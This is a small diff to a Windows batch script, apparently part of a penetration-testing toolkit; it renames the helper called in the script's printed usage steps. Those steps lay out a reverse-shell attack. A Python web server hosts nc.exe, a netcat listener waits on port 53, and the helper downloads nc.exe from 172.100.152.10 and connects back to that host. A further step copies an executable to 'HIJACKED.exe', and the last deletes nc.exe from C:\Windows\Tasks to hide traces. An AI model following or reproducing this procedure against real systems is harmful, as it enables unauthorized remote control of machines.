@@ -53,7 +53,7 @@ goto :eof
 echo -------------------------------------------
 echo    1.   python3 -m http.server -d . ^&
 echo    2.   nc -lvnp 53
-echo    3.   .\bat2nc.bat http://172.100.152.10:8000/nc.exe 172.100.152.10 53
+echo    3.   .\nc.bat http://172.100.152.10:8000/nc.exe 172.100.152.10 53
 echo    4.   copy x.exe HIJACKED.exe
 echo    5.   del C:\Windows\Tasks\nc.exe
 echo -------------------------------------------
